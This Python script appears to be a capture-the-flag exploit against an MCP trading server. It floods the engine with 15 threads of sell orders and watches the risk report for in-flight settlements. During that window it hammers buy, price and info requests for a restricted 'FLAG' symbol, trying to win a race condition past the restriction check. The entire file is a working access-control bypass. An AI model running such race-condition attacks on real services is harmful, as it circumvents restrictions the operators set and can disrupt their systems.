#!/usr/bin/env python3
"""Precise test: fire place_order(FLAG) exactly during the fill/vault window.

Background threads submit legit orders (SELL = no cash needed) to keep the
engine busy; we detect the fill window via get_risk_report(inflight>0) and
hammer FLAG submissions + FLAG price reads during it.
"""
import json, threading, time, sys
from mcpclient import MCP, extract

def main():
    base = MCP()
    print("portfolio:", extract(base.tool("get_portfolio")))

    stop = [False]
    legit_results = []
    def legit_worker(i):
        try:
            mm = MCP()
            while not stop[0]:
                r = extract(mm.tool("place_order", {"symbol":"AAPL","quantity":1,"order_type":"sell"}, timeout=60))
                legit_results.append(r)
                time.sleep(0.02)
        except Exception as e:
            legit_results.append("EXC "+str(e))
    threads = [threading.Thread(target=legit_worker, args=(i,), daemon=True) for i in range(15)]
    for t in threads: t.start()

    hits = []
    flag_session = MCP()
    t0 = time.time()
    while time.time()-t0 < 25:
        try:
            rr = json.loads(extract(base.tool("get_risk_report")))
        except Exception:
            continue
        if rr.get("settlements_inflight", 0) > 0:
            # we are inside a fill window -> hit FLAG hard, repeatedly
            for _ in range(3):
                r = extract(flag_session.tool("place_order", {"symbol":"FLAG","quantity":1,"order_type":"buy"}, timeout=30))
                if "RESTRICTED" not in r:
                    hits.append(r); print("!!! FLAG ORDER SUCCEEDED:", r)
                fp = extract(flag_session.tool("get_stock_price", {"symbol":"FLAG"}, timeout=30))
                if "RESTRICTED" not in fp:
                    hits.append(fp); print("!!! FLAG PRICE:", fp)
                fi = extract(flag_session.tool("get_stock_info", {"symbol":"FLAG"}, timeout=30))
                if "KPMG" in fi:
                    hits.append(fi); print("!!! FLAG INFO:", fi)
    stop[0] = True
    time.sleep(0.5)
    print("legit orders done:", len(legit_results), "failures:", sum(1 for x in legit_results if not x.startswith("{")))
    print("hits:", hits)
    print("portfolio:", extract(base.tool("get_portfolio")))
    print("risk:", extract(base.tool("get_risk_report")))

if __name__ == "__main__":
    main()
